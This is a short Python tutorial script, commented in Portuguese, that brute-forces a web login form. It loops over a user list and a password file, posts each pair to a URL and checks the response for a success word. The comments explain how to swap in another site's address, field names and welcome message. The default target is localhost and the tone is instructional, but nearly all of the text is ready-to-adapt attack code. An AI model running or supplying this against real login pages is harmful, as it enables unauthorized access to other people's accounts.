""" Toda vez que você acessa a web ou um servidor, você faz um tipo de requisição, seja ela GET (requisições pela URL) ou POST ( requisições em formulário) também existem outros tipos mais o projeto de hoje para Bruteforce trabalhará com requisições POST para preenchimento de formulário. """

import requests #importação da biblioteca necessária para as requisições.
from usuarios import users #aqui importamos a lista de usuários

# iremos agora criar a primeira função, aonde ele irá ler dados.
def lerDados():
    with open("./password.txt", "r") as arquivo:
        for linha in arquivo:
            yield linha.strip()

# Iremos agora criar a função para realizar a requisição
def requisicao():
    url = "http://127.0.0.1:5000" #aqui você define o site 
    for user in users():
        for senhas in lerDados():
#aqui nois temos os parâmetros aonde você irá informa os campos do formulário aonde será inserido os dados
            parametros = { 
                'usuario':user, #aqui você deve trocar usuario pelo parâmetro do usuário
                'senha':senhas #aqui você deve trocar senha pelo parâmetro da senha 
            }
            req = requests.post(url,data=parametros)
            if "sucesso" in req.text: #aqui e crucial, você deve modificar "sucesso" por alguma mensagem de boas vindas que o site imprime quando você faz login corretamente.
                print (f" sucesso {user} - {senhas}")
            else:
                print (f"falha {user} - {senhas} X")
requisicao()

""" esse exemplo funciona verificando variável.text, oque pode ser falho na maioria das plataformas, já que ele funciona verificando resposta do site. busque no meu diretório um exemplo melhor que fique por exemplo se alguma mensagem específica foi retornada na plataforma """
